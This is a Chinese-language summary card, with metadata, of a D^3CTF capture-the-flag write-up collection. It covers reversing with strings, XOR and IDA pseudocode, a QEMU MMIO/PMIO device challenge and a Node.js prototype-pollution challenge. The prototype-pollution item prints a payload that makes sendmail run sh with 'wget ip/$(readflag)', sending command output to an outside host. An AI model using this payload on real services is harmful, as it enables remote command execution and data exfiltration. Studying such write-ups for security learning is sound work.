---
title: D^3CTF WriteUp
contest: D3CTF
year: 2018
difficulty: medium
vuln_type: pwn_unknown
tags: [qemu, mmio, pmoi, xtea, prototype-pollution, sandbox, nodejs]
attack_chain:
  - strings 找 flag 直接读
  - 字节替换 + 异或
  - 复制 IDA C 伪代码到 VS 穷举
  - prototype pollution sendmail
  - PMIO/MMIO QEMU 设备
  - 自定义 XTEA delta=0x61C88647
key_payload: strings + IDA C 伪代码穷举 + prototype pollution
one_liner: D^3CTF 早期 WriteUp：strings 一把梭 + QEMU 客制化 MMIO/PMIO 设备逆向。
lesson: 招新赛 WP 经常是"strings + 异或"就能过的入门题，要识别质量。
quality: low
---

D^3CTF（早期）WriteUp 集合，作者 ChaMd5 Venom 战队。

**主要题目**：
1. **简单题** — `strings` 找 flag，monitor 没关，直接读 flag。后面是字节替换 + 异或；直接复制 IDA C 伪代码到 VS 改后穷举，效率高。

2. **prototype pollution** — Node.js `constructor.prototype.sendmail=true, path=sh, args=["-c","wget ip/$(readflag)"]` 触发反弹 shell。

3. **PMIO/MMIO QEMU 设备** — C 代码 + `iopl(3)` + mmap resource0 + pmio_write(0xc040, value)；自定义 XTEA delta=0x61C88647 加密 + decrypt 函数。

4. **256 字节字节替换 + 异或** — `subArr[256]` 表 + `addArr[256]` 加法表 + `addBaseArr[256]` 基址表；用 `printArray` 打印还原。

5. **extendSpace 函数** — IDA `recur(addr)` 递归找函数关系，识别 mov/call 模式，xor 推导下一函数。

**质量评估**：本 WP 主要是招新赛题，strings + IDA + 异或就能解，适合作为入门参考但深度有限。
